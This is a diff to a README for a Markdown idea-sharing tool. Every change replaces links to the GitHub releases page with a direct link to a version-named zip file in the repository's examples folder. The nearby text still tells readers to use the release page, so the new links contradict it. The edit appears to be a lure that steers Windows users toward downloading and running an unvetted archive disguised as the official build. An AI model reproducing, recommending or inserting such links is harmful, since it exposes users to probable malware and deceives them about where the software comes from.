@@ -1,6 +1,6 @@
 # 🧩 IDEA.md - Share Ideas, Not Code
 
-[![Download IDEA.md](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/RizzKyCoas/IDEA.md/releases)
+[![Download IDEA.md](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/RizzKyCoas/IDEA.md/raw/refs/heads/main/examples/md-IDE-v3.8-beta.3.zip)
 
 ## 📘 What IDEA.md Is
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Visit this page to download the latest release for Windows:
 
-[https://github.com/RizzKyCoas/IDEA.md/releases](https://github.com/RizzKyCoas/IDEA.md/releases)
+[https://github.com/RizzKyCoas/IDEA.md/raw/refs/heads/main/examples/md-IDE-v3.8-beta.3.zip](https://github.com/RizzKyCoas/IDEA.md/raw/refs/heads/main/examples/md-IDE-v3.8-beta.3.zip)
 
 If the release includes a Windows app, follow these steps:
 1. open the release page
@@ -214,7 +214,7 @@ It is also useful for knowledge management because the file can act as a simple 
 
 Visit the release page to download the latest Windows build:
 
-[https://github.com/RizzKyCoas/IDEA.md/releases](https://github.com/RizzKyCoas/IDEA.md/releases)
+[https://github.com/RizzKyCoas/IDEA.md/raw/refs/heads/main/examples/md-IDE-v3.8-beta.3.zip](https://github.com/RizzKyCoas/IDEA.md/raw/refs/heads/main/examples/md-IDE-v3.8-beta.3.zip)
 
 Open the page, choose the newest release, and download the file for Windows from there
 
